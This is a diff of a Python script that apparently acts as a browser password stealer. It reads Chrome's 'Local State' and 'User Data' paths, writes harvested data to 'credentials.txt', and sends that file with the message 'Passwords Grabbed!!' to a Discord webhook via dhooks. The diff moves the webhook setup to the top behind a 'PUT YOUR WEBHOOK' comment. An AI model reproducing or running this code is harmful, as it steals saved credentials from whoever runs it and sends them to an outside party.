@@ -12,6 +12,35 @@ import csv
 from dhooks import Webhook, File
 
 
+
+
+
+
+
+
+
+
+
+hook = Webhook("WEBHOOK_HERE") # -------------------------------------------------------------PUT YOUR WEBHOOK IN THE "WEBHOOK_HERE" FIELD --------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(fr"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(fr"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
@@ -95,7 +124,5 @@ if __name__ == '__main__':
     except Exception as e:
         print("[ERR] %s"%str(e))
 
-
-hook = Webhook("WEBHOOK_HERE")
 hook.send("Passwords Grabbed!!")
 hook.send(file=File("credentials.txt"))
